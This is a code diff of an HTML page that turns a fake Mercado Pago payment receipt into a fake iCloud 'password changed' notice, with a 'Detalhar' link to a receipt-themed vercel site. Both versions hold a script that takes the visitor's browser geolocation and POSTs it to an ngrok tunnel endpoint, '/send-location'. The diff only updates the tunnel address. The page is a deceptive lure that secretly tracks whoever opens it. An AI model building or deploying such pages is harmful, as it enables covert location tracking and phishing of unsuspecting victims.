@@ -11,21 +11,21 @@
 <body>
   <div class="comprovante-container">
 
-    <div style="width: 100%"><iframe width="100%" height="600" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?width=100%25&amp;height=600&amp;hl=en&amp;q=Rua%20Rodrigues%20alves,%20natal,%20rio%20grande%20do%20norte+(Natal)&amp;t=&amp;z=14&amp;ie=UTF8&amp;iwloc=B&amp;output=embed"><a href="https://www.gps.ie/collections/personal-trackers/">Elderly trackers</a></iframe></div>
+    <h1>iCloud</h1>
 
-    <!--<h1>Comprovante de Pagamento</h1>
+    <!--<h1>Comprovante de Pagamento</h1> -->
 
     
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor:</span> R$ 109,90</p>
-      <p><span>De:</span> Allan Teixeira</p>
-      <p><span>Status:</span> Enviado com sucesso</p>
-    </div> -->
+      <p><span>Usuario:</span> A********e </p>
+      <p><span>Senha:</span> *******</p>
+      <p><span>Status:</span> Senha alterada </p>
+    </div>
 
     <!--<button class="botao" onclick="window.print()">Imprimir</button> -->
     <button class="botao">
-      <a href="https://inc-cloud.vercel.app/" target="_blank" style ="text-decoration: none; color: white">Detalhar</a>
+      <a href="https://mercado-pago-comprovante.vercel.app/" target="_blank" style ="text-decoration: none; color: white">Detalhar</a>
     </button>
 
     <div class="comprovante-footer">
@@ -59,7 +59,7 @@
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("https://9c33-177-89-10-17.ngrok-free.app/send-location", {
+      fetch("https://aaf3-177-89-10-17.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
